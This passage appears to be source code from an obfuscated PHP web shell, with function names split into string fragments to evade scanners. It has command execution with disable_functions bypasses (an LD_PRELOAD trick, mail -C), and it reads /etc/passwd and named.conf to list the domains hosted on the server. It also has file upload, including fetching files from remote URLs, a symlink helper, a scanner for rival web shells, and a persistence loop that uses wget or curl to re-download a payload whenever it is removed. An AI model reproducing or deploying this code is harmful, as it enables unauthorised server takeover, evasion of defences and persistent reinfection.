		if ($fe("fi"."le_ge"."t_co"."nten"."ts")) {
			$fgc = "fi"."le_ge"."t_co"."nten"."ts";
			$r = @$fgc("file://" . $script);
			if ($r && $r !== "") { @unlink($script); return $r; }
		}
		if ($fe("ma"."il")) {
			$mh = "ma"."il";
			@$mh("x@x.x", "m", "", "-C" . $script);
		}
		$ldPre = $tmpDir . "/.maw_ld_" . substr(md5(uniqid()), 0, 6);
		@file_put_contents($ldPre, "#!/bin/sh\n" . $cmd . "\n");
		@chmod($ldPre, 0755);
		$se = "sh"."ell_ex"."ec";
		$out = @$se("LD_PRELOAD=" . $ldPre . " /bin/true");
		@unlink($ldPre);
		if ($out && $out !== "") { @unlink($script); return $out; }
		@unlink($script);
	}
	return false;
}

function komend($kom, $lk) {
	$fe = "fu"."ncti"."on_ex"."ists";
	$hsc = "htm"."lspe"."cialc"."hars";
	$out = mawCmd($kom, $lk);
	if ($out === false || $out === "") {
		$avail = array();
		$all = array("p"."ro"."c_o"."pe"."n", "ex"."ec", "sh"."ell_ex"."ec", "sy"."stem", "pa"."sth"."ru", "po"."pen", "cu"."rl_in"."it", "ma"."il");
		foreach ($all as $fn) if ($fe($fn)) $avail[] = $fn;
		$ig = "in"."i_g"."et";
		$dis = @$ig("disable_functions");
		$imp = "im"."plo"."de";
		$out = "[!] All command methods failed.\n[!] Available: " . (empty($avail) ? "NONE" : @$imp(", ", $avail)) . "\n[!] Disabled: " . ($dis ? $dis : "none");
	}
	return "<pre>" . $hsc($out) . "</pre>";
}

function komenb($kom, $lk) {
	$out = mawCmd($kom, $lk);
	if ($out === false) return "";
	return $out;
}

function gtd() {
	$a = "is_rea"."dable";$b = "fi"."le_ge"."t_con"."ten"."ts";
	$c = "pr"."eg_ma"."tch_"."al"."l";$d = "fil"."e_exi"."sts";
	$e = "sca"."ndi"."r";$f = "co"."unt";
	$g = "arr"."ay_un"."ique";$h = "sh"."el"."l_"."ex"."ec";
	$i = "pr"."eg_"."mat"."ch";
	if ($a("/e"."tc"."/na"."me"."d.co"."nf")) {
		$a = $b("/e"."tc"."/na"."me"."d.co"."nf");
		$c("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $a, $b);
		$b = $b[1]; return $f($g($b))." Dom"."ains";
	} elseif ($d("/va"."r/na"."med"."/na"."me"."d.lo"."cal")) {
		$a = $e("/v"."ar/"."nam"."ed");
		return $f($a)." Dom"."ains";
	} elseif ($a("/e"."tc"."/p"."as"."sw"."d")) {
		$a = $b("/e"."tc"."/p"."as"."sw"."d");
		if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
			$c("/\/vh"."os"."ts\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		} else {
			$c("/\/ho"."me\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		}
	} elseif (!empty($h("ca"."t /e"."tc/"."pa"."ss"."wd"))) {
		$a = $h("ca"."t /e"."tc/"."pa"."ss"."wd");
		if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
			$c("/\/vh"."os"."ts\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		} else {
			$c("/\/ho"."me\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		}
	} else {
		return "0 Domains";
	}
}

function esyeem($tg, $lk) {
	$a = "fun"."cti"."on_e"."xis"."ts";
	$e = "sy"."mli"."nk";
	if ($a("sy"."mli"."nk")) {
		if (file_exists($lk) || is_link($lk)) { @unlink($lk); }
		if (@$e($tg, $lk)) { clearstatcache(true, $lk); return true; }
		clearstatcache(true, $lk);
		if (is_link($lk) || file_exists($lk)) return true;
	}
	if ($a("pr"."oc_"."op"."en")) {
		$ds = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
		$ph = @proc_open("l"."n -s"."fn ".escapeshellarg($tg)." ".escapeshellarg($lk), $ds, $pp);
		if (is_resource($ph)) {
			@fclose($pp[0]);
			@stream_get_contents($pp[1]); @fclose($pp[1]);
			@stream_get_contents($pp[2]); @fclose($pp[2]);
			@proc_close($ph);
		}
		clearstatcache(true, $lk);
		return (is_link($lk) || file_exists($lk)) ? true : false;
	}
	return false;
}

function sds($sads, &$results = array()) {
	$iwr = "is"."_wri"."tab"."le";
	$ira = "is_r"."eada"."ble";
	$ph = "pr"."eg_ma"."tch";
	$sa = "sc"."and"."ir";
	$rh = "re"."alp"."ath";
	$idr = "i"."s_d"."ir";
	if (!$ira($sads) || !$iwr($sads) || $ph("/\/app"."licat"."ion\/|\/sy"."st"."em/i", $sads)) {
		return false;
	}
    $files = $sa($sads);

    foreach ($files as $key => $value) {
        $path = $rh($sads . DIRECTORY_SEPARATOR . $value);
        if (!$idr($path)) {
            //$results[] = $path;
        } else if ($value != "." && $value != "..") {
            sds($path, $results);
            $results[] = $path;
        }
    }

    return $results;
}

function crul($web) {
	$cr = "cu"."rl_set"."opt";
	$cx = "cu"."rl_"."ex"."ec";
	$ch = "cu"."rl_clo"."se";
	$ceha = curl_init();
	$cr($ceha, CURLOPT_URL, $web);
	$cr($ceha, CURLOPT_RETURNTRANSFER, 1);
	return $cx($ceha);
	$ch($ceha);
}

function green($text) {
	echo '<div class="alert-success-custom"><i class="fas fa-check-circle"></i> '.$text.'</div>';
}

function red($text) {
	echo '<div class="alert-danger-custom"><i class="fas fa-exclamation-circle"></i> '.$text.'</div>';
}

function oren($text) {
	return '<div class="alert-warning-custom"><i class="fas fa-exclamation-triangle"></i> '.$text.'</div>';
}

function tuls($nm, $lk) {
	return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}

function cfgSc($dir, $patterns, &$results = array(), $depth = 0) {
	if ($depth > 5) return $results;
	$ira = "is_r"."eada"."ble";
	$scd = "sc"."and"."ir";
	$ifi = "i"."s_fi"."le";
	if (!$ira($dir)) return $results;
	$files = @$scd($dir);
	if (!is_array($files)) return $results;
	foreach ($files as $file) {
		if ($file == '.' || $file == '..') continue;
		$path = $dir.'/'.$file;
		if ($ifi($path)) {
			$bn = "ba"."sena"."me";
			$fn = $bn($path);
			foreach ($patterns as $p) {
				if ($fn === $p) {
					$results[] = $path;
					break;
				}
			}
		} else {
			cfgSc($path, $patterns, $results, $depth + 1);
		}
	}
	return $results;
}

function mawEntropy($data) {
	if (empty($data)) return 0.0;
	$h = count_chars($data, 1);
	$len = strlen($data);
	$e = 0.0;
	foreach ($h as $v) {
		$p = $v / $len;
		$e -= $p * log($p, 2);
	}
	return $e;
}

function mawSnippet($content, $len = 300) {
	$content = preg_replace('/\s+/', ' ', (string)$content);
	$content = trim($content);
	$hsc = "ht"."mlspe"."cialcha"."rs";
	if (strlen($content) <= $len) return $hsc($content);
	return $hsc(substr($content, 0, $len)) . '...';
}

function mawDetect($filepath, $filesize, $ext = '') {
	$fgt = "f"."ile_g"."et_c"."onten"."ts";
	$content = @$fgt($filepath);
	if ($content === false) return null;
	$score = 0;
	$flags = array();
	$confidence = 'LOW';
	$layers = array('layer1' => 0, 'layer2' => 0, 'layer3' => 0, 'layer4' => 0, 'critical' => 0, 'combo' => 0);
	$entropy = mawEntropy($content);
	$has1 = false; $has2 = false; $has3 = false; $has4 = false;
	if (preg_match('/hexdec\s*\(\s*\$[a-zA-Z0-9_]+\s*\[/i', $content)) {
		$has1 = true; $layers['layer1'] += 15; $flags[] = 'L1:hexdec_array';
	}
	$funcs = array('ev'.'al' => 20, 'ass'.'ert' => 18, 'cre'.'ate_func'.'tion' => 22, 'sy'.'stem' => 15, 'ex'.'ec' => 15, 'she'.'ll_ex'.'ec' => 15, 'pas'.'sthru' => 15, 'ba'.'se64_de'.'code' => 10, 'gz'.'inf'.'late' => 12, 'str'.'_rot13' => 10);
	foreach ($funcs as $fn => $pts) {
		if (preg_match('/\b' . preg_quote($fn, '/') . '\s*\(/i', $content)) {
			$layers['layer1'] += $pts; $flags[] = "L1:func_$fn";
		}
	}
	if (preg_match('/\$\w+\s*=\s*\[\s*(?:\s*["\'][\da-fA-F]{16,}["\'](?:\s*,\s*)?){2,}\s*\]/i', $content)) {
		$has2 = true; $layers['layer2'] += 45; $flags[] = 'L2:encoded_array'; $confidence = 'MEDIUM';
	}
	if (preg_match('/\$\w+\s*=\s*["\'][\da-fA-F]{100,}["\']/i', $content)) {
		$layers['layer2'] += 35; $flags[] = 'L2:long_hex';
	}
	$concat = array(
		'/["\'][a-z_]{1,4}["\']\s*\.\s*["\'][a-z_]{1,4}["\']/i' => 20,
		'/(?:["\'][a-z_]{1,2}["\']\s*\.\s*){3,}/i' => 35,
	);
	foreach ($concat as $pat => $pts) {
		if (preg_match_all($pat, $content, $mm)) {
			$c = count($mm[0]);
			$layers['layer2'] += min($pts * $c, $pts * 2); $flags[] = "L2:concat:$c";
		}
	}
	if (preg_match('/\$\w+\s*\[\s*\d+\s*\]\s*\(/i', $content)) {
		$has3 = true; $layers['layer3'] += 65; $flags[] = 'L3:dynamic_call';
		if ($confidence === 'LOW') $confidence = 'HIGH';
	}
	if (preg_match('/\$\{\s*\$[a-zA-Z_][a-zA-Z0-9_]*\s*\}/i', $content)) {
		$layers['layer3'] += 40; $flags[] = 'L3:var_var';
	}
	if (preg_match('/call_user_func(_array)?\s*\(/i', $content)) {
		$layers['layer3'] += 45; $flags[] = 'L3:call_user_func';
	}
	$indirect = array(
		'/\$\w+\s*=\s*["\']system["\']\s*;.*\$\w+\s*\(/is' => 70,
		'/array_map\s*\(\s*["\'](?:system|exec|assert)["\']/i' => 75,
		'/array_filter\s*\([^)]*["\']assert["\']/i' => 70,
		'/array_walk\s*\([^)]*["\'](?:system|exec)["\']/i' => 70
	);
	foreach ($indirect as $pat => $pts) {
		if (preg_match($pat, $content)) {
			$layers['layer3'] += $pts; $flags[] = 'L3:indirect_exec';
		}
	}
	if (preg_match('/\$_(POST|GET|REQUEST)\s*\[\s*[\'"]command[\'"]\s*\]/i', $content)) {
		$has4 = true; $layers['layer4'] += 100; $flags[] = 'L4:input_command'; $confidence = 'CRITICAL';
	}
	foreach (array('cmd' => 80, 'exec' => 75, 'shell' => 85, 'system' => 80) as $pm => $pts) {
		if (preg_match('/\$_(POST|GET|REQUEST)\s*\[\s*[\'"]' . $pm . '[\'"]\s*\]/i', $content)) {
			$layers['layer4'] += $pts; $flags[] = "L4:input_$pm";
			if ($confidence !== 'CRITICAL') $confidence = 'HIGH';
		}
	}
	if (preg_match('/ev'.'al\s*\(\s*(ba'.'se64_de'.'code|gz'.'inf'.'late|gzunc'.'ompress|str'.'_rot13)\s*\(/i', $content)) {
		$layers['critical'] += 150; $flags[] = 'CRIT:eval_decoder'; $confidence = 'CRITICAL';
	}
	if (preg_match('/ass'.'ert\s*\(\s*(ba'.'se64_de'.'code|gz'.'inf'.'late|str'.'_rot13)\s*\(/i', $content)) {
		$layers['critical'] += 140; $flags[] = 'CRIT:assert_decoder'; $confidence = 'CRITICAL';
	}
	if (preg_match('/ev'.'al\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i', $content)) {
		$layers['critical'] += 180; $flags[] = 'CRIT:eval_input'; $confidence = 'CRITICAL';
	}
	if (preg_match('/(sy'.'stem|ex'.'ec|she'.'ll_ex'.'ec|pas'.'sthru)\s*\(\s*\$_(GET|POST|REQUEST)/i', $content)) {
		$layers['critical'] += 170; $flags[] = 'CRIT:system_input'; $confidence = 'CRITICAL';
	}
	if (preg_match('/preg_replace\s*\([^)]*\/[a-z]*e[a-z]*[\'"]/i', $content)) {
		$layers['critical'] += 160; $flags[] = 'CRIT:preg_eval'; $confidence = 'CRITICAL';
	}
	$sigs = array('c99'.'shell', 'r57'.'shell', 'wso sh'.'ell', 'b3'.'74k', 'ind'.'oxploit', 'Fil'.'esMan', 'WSO ', 'c99 ', 'r57 ', 'An'.'OnSeC', 'Min'.'i Sh'.'ell', 'She'.'ll Ba'.'ckdoor', 'Web'.'shell');
	foreach ($sigs as $sg) {
		if (stripos($content, $sg) !== false) {
			$layers['critical'] += 200; $flags[] = "CRIT:known:$sg"; $confidence = 'CRITICAL';
			break;
		}
	}
	$active = ($has1 ? 1 : 0) + ($has2 ? 1 : 0) + ($has3 ? 1 : 0) + ($has4 ? 1 : 0);
	if ($has1 && $has2) { $layers['combo'] += 30; $flags[] = 'COMBO:L1+L2'; }
	if ($has2 && $has3) {
		$layers['combo'] += 50; $flags[] = 'COMBO:L2+L3';
		if ($confidence === 'LOW') $confidence = 'HIGH';
	}
	if ($has3 && $has4) { $layers['combo'] += 70; $flags[] = 'COMBO:L3+L4'; $confidence = 'CRITICAL'; }
	if ($active >= 3) {
		$layers['combo'] += 40; $flags[] = 'COMBO:triple';
		if ($confidence !== 'CRITICAL') $confidence = 'HIGH';
	}
	if ($active === 4) { $layers['combo'] += 60; $flags[] = 'COMBO:full'; $confidence = 'CRITICAL'; }
	if (preg_match('/[\'"][^\'"\n]{3,}[\'"]\s*\^\s*(?:chr\s*\(\s*\d+\s*\)[\s\.]*){3,}/i', $content)) {
		$score += 65; $flags[] = 'HIGH:chr_xor';
	}
	$apc = preg_match_all('/\$\w+\s*\.=\s*["\'][A-Za-z0-9+\/=]{2,}["\']/i', $content);
	if ($apc >= 10) { $score += 55; $flags[] = "HIGH:b64_append:$apc"; }
	if ($entropy > 7.7) { $score += 40; $flags[] = 'SUSP:entropy_crit:' . round($entropy, 2); }
	elseif ($entropy > 7.3) { $score += 20; $flags[] = 'SUSP:entropy_high:' . round($entropy, 2); }
	if ($ext === '(none)') { $score += 25; $flags[] = 'SUSP:no_ext'; }
	$w = array('layer1' => 0.8, 'layer2' => 1.0, 'layer3' => 1.2, 'layer4' => 1.5, 'critical' => 2.0, 'combo' => 1.0);
	foreach ($layers as $lk => $lv) { $score += $lv * $w[$lk]; }
	$score = min(255, round($score));
	$legit = false;
	if (preg_match_all('/\bnamespace\s+[A-Za-z0-9_\\\\]+\s*;/i', $content) >= 2 &&
		preg_match_all('/\bclass\s+[A-Za-z0-9_]+/i', $content) >= 3) { $legit = true; }
	if (preg_match_all('/\/\*\*[\s\S]*?\*\//i', $content) >= 5) { $legit = true; }
	if (preg_match('/ComposerAutoloaderInit|Plugin Name:|Theme Name:|@package\s+WordPress/i', $content)) { $legit = true; }
	if ($legit && $score < 100) { $score = max(0, $score - 40); $flags[] = 'CTX:legit'; }
	if ($score >= 100) { $confidence = 'CRITICAL'; }
	elseif ($score >= 85) { if ($confidence === 'LOW') $confidence = 'HIGH'; }
	elseif ($score >= 60) { if ($confidence === 'LOW') $confidence = 'MEDIUM'; }
	return array('file' => $filepath, 'raw_score' => $score, 'layer_scores' => $layers, 'entropy' => $entropy, 'flags' => $flags, 'filesize' => $filesize, 'confidence' => $confidence, 'ext' => $ext, 'snippet' => mawSnippet($content));
}

function mawScDir($path) {
	$results = array();
	$count = 0;
	$exts = array('php', 'php7', 'php56', 'php5', 'php4', 'php3', 'phtml', 'phps', 'pht', 'inc', 'suspected', 'txt', 'bak', 'old');
	try {
		$it = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
			RecursiveIteratorIterator::SELF_FIRST,
			RecursiveIteratorIterator::CATCH_GET_CHILD
		);
		foreach ($it as $fi) {
			if ($fi->isDir()) continue;
			$full = $fi->getPathname();
			$fn = $fi->getFilename();
			$ex = strtolower($fi->getExtension());
			$fs = $fi->getSize();
			$noext = ($ex === '' || strpos($fn, '.') === false);
			if (!in_array($ex, $exts) && !$noext) continue;
			if ($fs > 15728640 || $fs === 0) continue;
			if ($noext || in_array($ex, array('txt', 'bak', 'old'))) {
				$peek = @file_get_contents($full, false, null, 0, 2048);
				if ($peek === false) continue;
				if (!preg_match('/<\?(?:php|=|\s)/i', $peek)) continue;
			}
			$d = mawDetect($full, $fs, $noext ? '(none)' : $ex);
			if ($d !== null && $d['raw_score'] > 0) { $results[] = $d; }
			$count++;
			if ($count > 150000) break;
		}
	} catch (Exception $e) {}
	return $results;
}

function mawFilter($results) {
	$wlPaths = array('/vendor/', '/node_modules/', '/wp-includes/', '/wp-admin/', '/cache/', '/tmp/', '/temp/', '/storage/', '/logs/', '/.git/', '/tests/', '/test/', '/docs/', '/documentation/', '/laravel/', '/symfony/', '/zend/', '/yii/', '/codeigniter/');
	$wlFiles = array('autoload.php', 'autoload_real.php', 'autoload_static.php', 'wp-config.php', 'wp-settings.php', 'composer.json', 'index.php', 'config.php', 'bootstrap.php');
	foreach ($results as &$r) {
		$sc = $r['raw_score'];
		foreach ($wlPaths as $wl) {
			if (stripos($r['file'], $wl) !== false) { $sc = max(0, $sc - 50); $r['flags'][] = 'CTX:white_path'; break; }
		}
		$bn = basename($r['file']);
		foreach ($wlFiles as $wf) {
			if (stripos($bn, $wf) !== false) { $sc = max(0, $sc - 40); $r['flags'][] = 'CTX:white_file'; break; }
		}
		$fs = max(0, min(255, intval(round($sc))));
		$r['final_score'] = $fs;
		if ($r['confidence'] !== 'CRITICAL') {
			if ($fs >= 100) { $r['confidence'] = 'CRITICAL'; }
			elseif ($fs >= 85) { $r['confidence'] = 'HIGH'; }
			elseif ($fs >= 60) { $r['confidence'] = 'MEDIUM'; }
			elseif ($fs >= 30) { $r['confidence'] = 'LOW'; }
		}
	}
	unset($r);
	return $results;
}

function mawStats($results) {
	$st = array('total' => count($results), 'critical' => 0, 'high' => 0, 'suspicious' => 0, 'safe' => 0, 'noext' => 0);
	foreach ($results as $r) {
		if (isset($r['ext']) && $r['ext'] === '(none)') { $st['noext']++; }
		if ($r['confidence'] === 'CRITICAL') { $st['critical']++; }
		elseif ($r['final_score'] >= 85) { $st['high']++; }
		elseif ($r['final_score'] >= 30) { $st['suspicious']++; }
		else { $st['safe']++; }
	}
	return $st;
}

define('MAW_AL_CFG', __DIR__ . '/.aloop.conf');
define('MAW_AL_HB', __DIR__ . '/.aloop.hb');

function mawAlCfg() {
	if (!file_exists(MAW_AL_CFG)) return null;
	$raw = @file_get_contents(MAW_AL_CFG);
	if ($raw === false) return null;
	$j = json_decode($raw, true);
	return is_array($j) ? $j : null;
}
function mawAlAge() {
	if (!file_exists(MAW_AL_HB)) return -1;
	return time() - @filemtime(MAW_AL_HB);
}
function mawAlAlive() {
	$c = mawAlCfg();
	if ($c === null) return false;
	$age = mawAlAge();
	$iv = isset($c['interval']) ? intval($c['interval']) : 60;
	return ($age >= 0 && $age <= ($iv * 4 + 20));
}
function mawAlKill($cfg) {
	$marker = isset($cfg['marker']) ? $cfg['marker'] : '';
	$worker = 'aloop_' . $marker . '.php';
	$out = array();
	@exec("pgrep -f " . escapeshellarg($worker), $out);
	if (empty($out)) {
		@exec("ps -ef | grep " . escapeshellarg($worker) . " | grep -v grep | awk '{print $2}'", $out);
	}
	foreach ($out as $pid) { if (is_numeric(trim($pid))) @exec('kill -9 ' . trim($pid) . ' 2>/dev/null'); }
	@unlink(MAW_AL_HB);
}
function mawAlCode($cfg) {
	$tpl = '<?php
// MAW-ALOOP:{{MARKER}}
error_reporting(0);
@set_time_limit(0);
$cfg_path = {{CONF}};
$conf = json_decode(@file_get_contents($cfg_path), true);
if (!$conf) { exit; }
$hb = {{HB}};
$interval = isset($conf[\'interval\']) ? intval($conf[\'interval\']) : 60;
$source = $conf[\'source_url\'];
$method = isset($conf[\'method\']) ? $conf[\'method\'] : \'wget\';
$path = $conf[\'path\'];
$target = isset($conf[\'target\']) ? $conf[\'target\'] : \'bp2.php\';

function mawalt_exists($path, $target) {
    try {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY, RecursiveIteratorIterator::CATCH_GET_CHILD);
        foreach ($it as $f) {
            if ($f->isFile() && $f->getFilename() === $target) return true;
        }
    } catch (Exception $e) {}
    return false;
}

function mawalt_randdir($path, $target) {
    do {
        $d = rtrim($path, \'/\') . \'/\' . $target . \'_\' . substr(md5(uniqid(mt_rand(), true)), 0, 10);
    } while (@file_exists($d));
    return $d;
}

while (true) {
    @file_put_contents($hb, time());
    if (!mawalt_exists($path, $target)) {
        $dir = mawalt_randdir($path, $target);
        @mkdir($dir, 0755, true);
        $dest = $dir . \'/\' . $target;
        $out = array();
        $rc = 1;
        if ($method === \'wget\') {
            @exec(\'wget -qO \' . escapeshellarg($dest) . \' \' . escapeshellarg($source), $out, $rc);
        } else {
            @exec(\'curl -fsSL \' . escapeshellarg($source) . \' -o \' . escapeshellarg($dest), $out, $rc);
        }
        if ($rc === 0 && @filesize($dest) > 0) {
            @file_put_contents($hb . \'.log\', date(\'c\') . \' REINSTALLED \' . $dest . "\\n", FILE_APPEND);
        }
    }
    sleep($interval);
}
';
	return strtr($tpl, array(
		'{{MARKER}}' => $cfg['marker'],
		'{{CONF}}'   => var_export(MAW_AL_CFG, true),
		'{{HB}}'     => var_export(MAW_AL_HB, true),
	));
}

echo '<div class="row mb-3">';
echo '<div class="col-md-6"><strong><i class="fas fa-server"></i> Se'.'rv'.'er'.' I'.'P:</strong> <span class="text-gold">'.ipsrv().'</span></div>';
echo '<div class="col-md-6"><strong><i class="fas fa-user"></i> Yo'.'ur I'.'P:</strong> <span class="text-gold">'.$_SERVER[$rad].'</span> <a href="'.mkUrl(array('opsi' => 'repip')).'" class="badge badge-custom ms-2">Re'.'ver'.'se I'.'P</a></div>';
echo '</div>';
echo '<div class="row mb-3">';
echo '<div class="col-md-6"><strong><i class="fas fa-globe"></i> We'.'b S'.'erv'.'er:</strong> <span class="text-gold">'.$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE'].'</span></div>';
$unm = "ph"."p_u"."na"."me";
echo '<div class="col-md-6"><strong><i class="fas fa-desktop"></i> Sys'.'tem:</strong> <span class="text-gold">'.@$unm().'</span></div>';
echo '</div>';
echo '<div class="row mb-3">';
$gcu = "g"."et_"."curr"."ent"."_us"."er";
$gmu = "g"."et"."my"."ui"."d";
echo '<div class="col-md-6"><strong><i class="fas fa-user-circle"></i> Us'.'er:</strong> <span class="text-gold">'.@$gcu().' ('.@$gmu().')</span></div>';
$phv = "ph"."pve"."rsi"."on";
echo '<div class="col-md-6"><strong><i class="fas fa-code"></i> PH'.'P V'.'er'.'sio'.'n:</strong> <span class="text-gold">'.@$phv().'</span></div>';
echo '</div>';
echo '<div class="row mb-3">';
echo '<div class="col-12"><strong><i class="fas fa-ban"></i> Dis'.'abl'.'e Fu'.'nct'.'ion:</strong> '.$disf.'</div>';
echo '</div>';
echo '<div class="row mb-3">';
echo '<div class="col-md-6"><strong><i class="fas fa-globe"></i> Dom'.'ain'.'s:</strong> <span class="text-gold">'.(empty(gtd()) ? '0 Dom'.'ains' : gtd()).'</span></div>';
echo '<div class="col-md-6"><strong><i class="fas fa-tools"></i> Extensions:</strong> ';
if (@$fnct("my"."sql_co"."nne"."ct")) {
    echo '<span class="badge bg-success me-1">MySQL</span>';
} else {
    echo '<span class="badge bg-danger me-1">MySQL</span>';
}
if (@$fnct("cu"."rl"."_in"."it")) {
    echo '<span class="badge bg-success me-1">cURL</span>';
} else {
    echo '<span class="badge bg-danger me-1">cURL</span>';
}
if (@$fxt("/"."us"."r/b"."in/w"."get")) {
    echo '<span class="badge bg-success me-1">WG'.'ET</span>';
} else {
    echo '<span class="badge bg-danger me-1">WG'.'ET</span>';
}
if (@$fxt("/u"."sr/b"."in"."/pe"."rl")) {
    echo '<span class="badge bg-success me-1">Pe'.'rl</span>';
} else {
    echo '<span class="badge bg-danger me-1">Pe'.'rl</span>';
}
if (@$fxt("/"."us"."r/b"."in/p"."ytho"."n2")) {
    echo '<span class="badge bg-success me-1">Pyt'.'ho'.'n</span>';
} else {
    echo '<span class="badge bg-danger me-1">Pyt'.'ho'.'n</span>';
}
if (@$fxt("/"."us"."r/b"."in/s"."u"."d"."o")) {
    echo '<span class="badge bg-success me-1">S'.'u'.'do</span>';
} else {
    echo '<span class="badge bg-danger me-1">S'.'u'.'do</span>';
}
if (@$fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c")) {
    echo '<span class="badge bg-success me-1">Pk'.'e'.'x'.'e'.'c</span>';
} else {
    echo '<span class="badge bg-danger me-1">Pk'.'e'.'x'.'e'.'c</span>';
}
echo '</div>';
echo '</div>';
echo '</div>';
echo '<div class="breadcrumb-custom"><strong><i class="fas fa-folder-open"></i> Di'.'rect'.'ory:</strong> ';

foreach($_POST as $key => $value){
	$_POST[$key] = $sts($value);
}

$lokasi = $srl('\\','/',$lokasi);
$lokasis = $exp('/',$lokasi);
$lokasinya = @$scd($lokasi);

foreach($lokasis as $id => $lok){
if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="'.mkUrl(array('loknya' => '/')).'">/</a>';
		continue;
	}
	if($lok == '') continue;
	$crum = '';
	for($i=0;$i<=$id;$i++){
	$crum .= "$lokasis[$i]";
	if($i != $id) $crum .= "/";
}
echo '<a href="'.mkUrl(array('loknya' => $crum)).'">'.$lok.'</a>/';
}

echo '</div>';
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['di'.'rnya'] == "2") {
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
		}
		if (empty($_FILES['ber'.'kas']['name'])) {
			echo oren("Fi"."le not Se"."lected !");
		} else {
			$tgn = $ftm($lokasi);
			$data = @$fpt($lokasi."/".$_FILES['ber'.'kas']['name'], @$fgt($_FILES['ber'.'kas']['tm'.'p_na'.'me']));
				if ($fxt($lokasi."/".$_FILES['ber'.'kas']['name'])) {
					$fl = $lokasi."/".$_FILES['ber'.'kas']['name'];
					green("Fi"."le Upl"."oa"."ded! <strong>".$fl."</strong>");
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo '<div class="alert-success-custom">Li'.'nk: <a href="'.$lwb.'" class="text-gold">'.$lwb.'</a></div>';
					}
					@$tch($lokasi, $tgn);@$tch($lokasi."/".$_FILES['ber'.'kas']['name'], $tgn);
				} else {
					red("Fa"."ile"."d to Up"."lo"."ad !");
			}
		}
	} elseif (isset($_POST['linknya'])) {
		if (empty($_POST['namalink'])) {
			echo oren("Fi"."lename cannot be empty !");
		} elseif (empty($_POST['darilink'])) {
			echo oren("Li"."nk cannot be empty !");
		} else {
			if ($_POST['di'.'rnya'] == "2") {
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
			}
				$tgn = $ftm($lokasi);
				$data = @$fpt($lokasi."/".$_POST['namalink'], @$fgt($_POST['darilink']));
				if ($fxt($lokasi."/".$_POST['namalink'])) {
					$fl = $lokasi."/".$_POST['namalink'];
					green("Fi"."le Uplo"."ade"."d! <strong>".$fl."</strong>");
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo '<div class="alert-success-custom">Li'.'nk: <a href="'.$lwb.'" class="text-gold">'.$lwb.'</a></div>';
					}
					@$tch($lokasi, $tgn);@$tch($lokasi."/".$_POST['namalink'], $tgn);
				} else {
					red("Fa"."iled to Up"."lo"."ad !");
				}
		}
	}
}

echo '<div class="info-card">';
echo '<h5 style=\'color:#fff\'><i class="fas fa-upload"></i> Uplo'.'ad Fi'.'le</h5>';
echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost" class="mb-0">';
echo '<div class="mb-3">';
echo '<div class="form-check form-check-inline">';
echo '<input class="form-check-input" type="radio" value="1" name="di'.'rnya" id="dir1" checked>';
echo '<label class="form-check-label" for="dir1">cur'.'ren'.'t_di'.'r ['.cdrd().']</label>';
echo '</div>';
echo '<div class="form-check form-check-inline">';
echo '<input class="form-check-input" type="radio" value="2" name="di'.'rnya" id="dir2">';
echo '<label class="form-check-label" for="dir2">docu'.'men'.'t_ro'.'ot ['.crt().']</label>';
echo '</div>';
echo '</div>';
echo '<input type="hidden" name="upwkwk" value="aplod">';
echo '<div class="row g-2 mb-3">';
echo '<div class="col-md-8">';
echo '<input type="fi'.'le" name="berkas" class="form-control">';
echo '</div>';
echo '<div class="col-md-4">';
echo '<button type="submit" name="berkasnya" class="btn btn-primary-custom w-100"><i class="fas fa-upload"></i> Up'.'load</button>';
echo '</div>';
echo '</div>';
echo '<div class="row g-2">';
echo '<div class="col-md-5">';
echo '<input type="text" name="darilink" class="form-control" placeholder="https://go'.'ogle.com/upl'.'oad.txt">';
echo '</div>';
echo '<div class="col-md-3">';
echo '<input type="text" name="namalink" class="form-control" placeholder="fi'.'le.txt">';
echo '</div>';
echo '<div class="col-md-4">';
echo '<button type="submit" name="linknya" class="btn btn-primary-custom w-100"><i class="fas fa-link"></i> Upload from URL</button>';
echo '</div>';
echo '</div>';
echo '</form>';
echo '</div>';
echo '<div class="info-card">';
echo '<h5 style=\'color:#fff\'><i class="fas fa-terminal"></i> Co'.'mm'.'an'.'d</h5>';
echo '<form method="post" enctype="appl'.'ication/x-ww'.'w-form-u'.'rlencoded" class="mb-0">';
echo '<div class="input-group">';
echo '<input type="text" name="komend" class="form-control" value="';
if (isset($_POST['komend'])) {
	echo $hsc($_POST['komend']);
} else {
	echo "un"."am"."e -"."a";
}
echo '">';
echo '<button type="submit" name="komends" class="btn btn-primary-custom"><i class="fas fa-play"></i> Run</button>';
echo '</div>';
echo '</form>';
echo '</div>';

